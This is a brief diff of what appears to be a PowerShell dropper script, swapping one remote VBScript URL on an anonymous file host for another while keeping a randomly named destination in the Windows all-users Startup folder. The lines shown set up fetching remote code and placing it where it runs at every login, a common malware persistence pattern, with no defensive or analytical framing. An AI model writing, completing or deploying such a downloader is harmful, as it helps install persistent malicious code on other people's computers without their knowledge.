@@ -1,4 +1,4 @@
-$url = "https://files.catbox.moe/0esiva.vbs"
+$url = "https://files.catbox.moe/txqdie.vbs"
 $destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"
 
 
